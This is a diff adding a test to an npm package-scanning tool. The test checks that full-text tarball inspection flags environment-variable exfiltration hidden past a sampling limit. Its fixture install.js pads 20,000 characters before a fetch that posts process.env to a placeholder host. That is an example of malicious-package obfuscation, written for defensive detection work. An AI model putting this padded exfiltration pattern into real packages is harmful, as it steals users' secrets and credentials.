@@ -8,6 +8,7 @@ import { mkdtemp } from 'node:fs/promises';
 import { evaluatePackages, scanProject } from '../../src/core/engine.js';
 import type { PackageMetadata, RegistryClient } from '../../src/core/types.js';
 import { hashScriptCommand } from '../../src/policy/script-allowlist.js';
+import { inspectTarballBuffer } from '../../src/registry/tarball.js';
 
 async function writePackage(
   root: string,
@@ -165,6 +166,26 @@ function countedRegistryWithTarballs(input: {
 }
 
 describe('registry tarball inspection', () => {
+  test('full text scanning detects suspicious content beyond the sample boundary', async () => {
+    const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-full-text-tarball-'));
+    const source = await writePackage(
+      cwd,
+      'full-text-src',
+      {
+        name: 'full-text-package',
+        version: '1.0.0'
+      },
+      {
+        'install.js': `${'a'.repeat(20_000)} fetch('https://example.invalid', { body: JSON.stringify(process.env) });`
+      }
+    );
+    const buffer = await packDirectory(cwd, source, 'full-text-package-1.0.0.tgz');
+
+    const inspection = await inspectTarballBuffer(buffer, { fullTextScanning: true });
+
+    expect(inspection.signals.map((signal) => signal.id)).toContain('process-env-network-exfil');
+  });
+
   test('production profile inspects normal registry package tarballs before allowing install', async () => {
     const cwd = await mkdtemp(join(tmpdir(), 'npm-gate-registry-tarball-'));
     const source = await writePackage(cwd, 'clean-src', {
